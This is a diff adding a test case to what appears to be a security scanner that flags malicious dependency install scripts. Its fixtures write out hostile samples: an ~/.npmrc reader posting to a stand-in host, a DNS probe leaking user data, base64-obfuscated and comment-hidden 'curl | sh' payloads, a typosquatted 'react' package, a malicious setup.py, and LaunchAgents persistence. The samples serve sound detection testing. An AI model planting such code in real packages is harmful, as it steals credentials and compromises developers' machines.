@@ -893,3 +893,73 @@ def agentfile_unreadable_same_size(r: Run) -> None:
         fx.file(f"~/Projects/{project}/AGENTS.md", bytes([0xff, 0xfe, 0x00]) + project[:4].encode() * 8)
     r.update()
     r.scan(T0)
+
+
+# ================================================================ deps.install-script：依赖的安装脚本
+
+def npm_pkg(fx: Fx, folder: str, name: str, version: str, scripts: Dict[str, str], files: Optional[Dict[str, str]] = None) -> None:
+    """folder 里的一个 npm 包：package.json（名字、版本、scripts），加 files（相对路径 → 文字）。"""
+    fx.file(f"{folder}/package.json", json.dumps({"name": name, "version": version, "scripts": scripts}, indent=2) + "\n")
+    for rel, text in (files or {}).items():
+        fx.file(f"{folder}/{rel}", text)
+
+
+NPMRC_POST = ("const fs = require('fs'), os = require('os'), path = require('path'), https = require('https');\n"
+              "const rc = fs.readFileSync(path.join(os.homedir(), '.npmrc'), 'utf8');\n"
+              "const req = https.request({ hostname: 'collect.example.invalid', method: 'POST', path: '/n' });\n"
+              "req.write(rc); req.end();\n")
+PREBUILT = ("const https = require('https'), fs = require('fs'), os = require('os'), path = require('path');\n"
+            "const bin = path.join(__dirname, 'bin', 'tool');\n"
+            "if (!process.env.TOOL_BINARY_PATH) https.get(registry() + '/@tool/' + os.platform() + '-' + os.arch(), res => {\n"
+            "  res.pipe(fs.createWriteStream(bin)).on('finish', () => fs.chmodSync(bin, 0o755));\n"
+            "});\n")
+BANNER = ("var env = process.env;\n"
+          "if (!env.ADBLOCK && !env.CI) console.log('Thank you for using this library! Please consider supporting it.');\n")
+PROBE = ("const os = require('os'), dns = require('dns');\n"
+         "const d = Buffer.from(os.userInfo().username + '|' + os.hostname()).toString('hex');\n"
+         "dns.lookup(d.slice(0, 60) + '.probe.example.invalid', () => {});\n")
+LAUNCH = ("#!/bin/sh\n"
+          "cp ./helper.plist ~/Library/LaunchAgents/com.example.helper.plist\n"
+          "launchctl load ~/Library/LaunchAgents/com.example.helper.plist\n")
+
+
+@case("rules/deps/install-script", "依赖的安装脚本（要确认）：钩子运行的文件读 ~/.npmrc 再发出去（两个项目里同一个包合成一条）、依赖混淆的探测、钩子里一段编码解开就运行、"
+      "全局包往 LaunchAgents 里放东西、虚拟环境里从源码装的包的 setup.py 下载就运行；钩子里换了行的第二条命令、/*! */ 后面跟着的代码、"
+      "开头带 BOM 的 package.json 也查；名字用 npm 装它的文件夹的（package.json 里写的不一样时说一句）。"
+      "预编译程序的下载、求赞助的横幅（经 node -e require 跟到）、node-gyp、没有钩子的包里的坏文件、钩子没运行的文件、site-packages 里的、项目自己的 package.json 不报。"
+      "第二轮什么都没变照报；改好一个以后那条没了")
+def deps_install_script(r: Run) -> None:
+    import base64
+    fx = r.fx
+    web = "~/Projects/web"
+    fx.file(f"{web}/package.json", json.dumps({"name": "web", "scripts": {"postinstall": "node own.js"}}) + "\n")
+    fx.file(f"{web}/own.js", NPMRC_POST)                                                       # 项目自己的：不看
+    npm_pkg(fx, f"{web}/node_modules/bad", "bad", "1.2.3", {"postinstall": "node lib/p.js"}, {"lib/p.js": NPMRC_POST, "unrun.js": LAUNCH})
+    npm_pkg(fx, f"{web}/node_modules/esb", "esb", "0.20.0", {"postinstall": "node install.js"}, {"install.js": PREBUILT})
+    npm_pkg(fx, f"{web}/node_modules/@corp/utils", "@corp/utils", "99.0.0", {"preinstall": "node index.js"}, {"index.js": PROBE})
+    npm_pkg(fx, f"{web}/node_modules/.pnpm/core@3.0.0/node_modules/core", "core", "3.0.0",
+            {"postinstall": "node -e \"try{require('./postinstall')}catch(e){}\""}, {"postinstall.js": BANNER})
+    npm_pkg(fx, f"{web}/node_modules/gyp", "gyp", "1.0.0", {"install": "node-gyp rebuild"}, {"binding.gyp": "{}\n"})
+    npm_pkg(fx, f"{web}/node_modules/plain", "plain", "1.0.0", {"test": "node evil.js"}, {"evil.js": NPMRC_POST})
+    blob = base64.b64encode(("require('child_process').execSync('curl -s https://x.example.invalid/a | sh'); " * 2).encode()).decode()
+    npm_pkg(fx, f"{web}/node_modules/hidden", "hidden", "0.0.9", {"postinstall": f"node -e \"eval(Buffer.from('{blob}','base64').toString())\""})
+    npm_pkg(fx, f"{web}/node_modules/odd", "Odd Name https://x.example.invalid", "1.0.0", {"preinstall": "curl -s https://x.example.invalid/i | bash"})
+    # 藏起来的：钩子里换行后的第二条命令、注释开头的一行后面跟着的代码、package.json 开头的 BOM、冒名的名字。
+    npm_pkg(fx, f"{web}/node_modules/nl", "nl", "1.0.0", {"postinstall": "echo building\nnode evil.js"}, {"evil.js": PROBE})
+    npm_pkg(fx, f"{web}/node_modules/banner", "banner", "2.0.0", {"install": "node i.js"},
+            {"i.js": "/*! banner v2 | MIT */require('child_process').execSync('curl -s https://x.example.invalid/b | sh');\n"})
+    fx.file(f"{web}/node_modules/raect/package.json", "\ufeff" + json.dumps({"name": "react", "version": "18.0.0", "scripts": {"preinstall": "node i.js"}}))
+    fx.file(f"{web}/node_modules/raect/i.js", NPMRC_POST)
+    npm_pkg(fx, "~/Projects/api/node_modules/bad", "bad", "1.2.3", {"postinstall": "node lib/p.js"}, {"lib/p.js": NPMRC_POST})
+    py = "~/Projects/py/.venv"
+    fx.file(f"{py}/pyvenv.cfg", "home = /usr/bin\n")
+    fx.file(f"{py}/src/helper/setup.py", "import os\nfrom setuptools import setup\nos.system('curl -s https://x.example.invalid/i | sh')\nsetup(name='helper')\n")
+    fx.file(f"{py}/lib/python3.12/site-packages/other/setup.py", "import os\nos.system('curl -s https://x.example.invalid/i | sh')\n")
+    npm_pkg(fx, "opt-homebrew/lib/node_modules/gtool", "gtool", "2.0.0", {"postinstall": "sh ./setup.sh"}, {"setup.sh": LAUNCH})
+    npm_pkg(fx, "~/.nvm/versions/node/v22.0.0/lib/node_modules/okcli", "okcli", "1.0.0", {"postinstall": "node postinstall.js"}, {"postinstall.js": BANNER})
+    r.update()
+    r.scan(T0)
+    r.scan(T0, note="什么都没变：读过的不再读，照报")
+    npm_pkg(fx, f"{web}/node_modules/@corp/utils", "@corp/utils", "99.0.1", {"preinstall": "node index.js"}, {"index.js": BANNER})
+    r.scan(T0, note="@corp/utils 换成了正常的版本：那条没了")
+    r.scan(T0, NO_FDA, note="没有完全磁盘访问：项目目录不在文稿里，照报")
